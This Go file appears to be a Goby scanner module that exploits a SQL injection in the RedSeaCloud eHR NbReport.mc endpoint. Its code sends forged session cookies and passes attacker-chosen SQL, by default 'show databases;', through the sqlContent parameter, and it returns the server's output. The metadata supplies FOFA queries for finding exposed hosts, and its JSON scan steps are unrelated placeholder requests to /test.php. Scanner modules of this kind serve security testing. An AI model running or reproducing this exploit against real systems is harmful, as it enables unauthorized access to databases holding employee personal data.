package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "RedSeaCloud eHR NbReport SQL Injection Vulnerability",
    "Description": "<p>The Red Sea eHR system focuses on the pain points of human resource management, breaks the data segmentation limitations of each functional module of the traditional eHR system, and creates an intelligent and interconnected human resource management solution for enterprises with data integration, process integration, and terminal integration, and builds a closed-loop, smooth and global business. A one-stop human resource management digital platform with data connectivity, highly integrated systems, and controllable authority specifications.</p>",
    "Product": "红海eHR",
    "Homepage": "https://www.hr-soft.cn/",
    "DisclosureDate": "2022-08-06",
    "Author": "zgk4@qq.com",
    "FofaQuery": "body=\"/RedseaPlatform/\"",
    "GobyQuery": "body=\"/RedseaPlatform/\"",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability in the Red Sea eHR system, allowing attackers to use this vulnerability to obtain database permissions and sensitive information</p>",
    "Recommendation": "<p>The manufacturer has released bug fixes, please pay attention to the update in time: <a href=\"https://www.hr-soft.cn/\">https://www.hr-soft.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sqli",
            "type": "input",
            "value": "show databases;",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "红海云eHR NbReport SQL 注入漏洞",
            "Product": "红海eHR",
            "Description": "<p>红海eHR系统，聚焦人力资源管理痛点，打破传统eHR系统各功能模块数据割裂局限，为企业打造数据一体化、流程一体化、终端一体化的智能互联人力资源管理解决方案，构建业务闭环流畅、全局数据贯通、系统高度集成、权限规范可控的一站式人力资源管理数字化平台。<br></p>",
            "Recommendation": "<p>厂商已发布漏洞修复，请及时关注更新：<a href=\"https://www.hr-soft.cn/\">https://www.hr-soft.cn/</a><br></p>",
            "Impact": "<p>红海eHR系统 存在sql注入漏洞，允许攻击者利用该漏洞获取数据库权限及敏感信息<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "RedSeaCloud eHR NbReport SQL Injection Vulnerability",
            "Product": "红海eHR",
            "Description": "<p>The Red Sea eHR system focuses on the pain points of human resource management, breaks the data segmentation limitations of each functional module of the traditional eHR system, and creates an intelligent and interconnected human resource management solution for enterprises with data integration, process integration, and terminal integration, and builds a closed-loop, smooth and global business. A one-stop human resource management digital platform with data connectivity, highly integrated systems, and controllable authority specifications.<br></p>",
            "Recommendation": "<p>The manufacturer has released bug fixes, please pay attention to the update in time: <a href=\"https://www.hr-soft.cn/\">https://www.hr-soft.cn/</a><br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in the Red Sea eHR system, allowing attackers to use this vulnerability to obtain database permissions and sensitive information<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10697"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/RedseaPlatform/NbReport.mc"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
    cfg.Header.Store("Cookie", "redseaUserInfo=1;REDSESSIONID=1")
    cfg.Data = "method=getDataList&sqlType=1&sqlContent=select md5(232);"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "be83ab3ecd0db773eb2dc1b0a17836a1")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sqli := ss.Params["sqli"].(string)
			uri := "/RedseaPlatform/NbReport.mc"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
    cfg.Header.Store("Cookie", "redseaUserInfo=1;REDSESSIONID=1")
    cfg.Data = fmt.Sprintf("method=getDataList&sqlType=1&sqlContent=%s", sqli)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
			expResult.Output = resp.Utf8Html
			expResult.Success = true
			}
			return expResult
		},
	))
}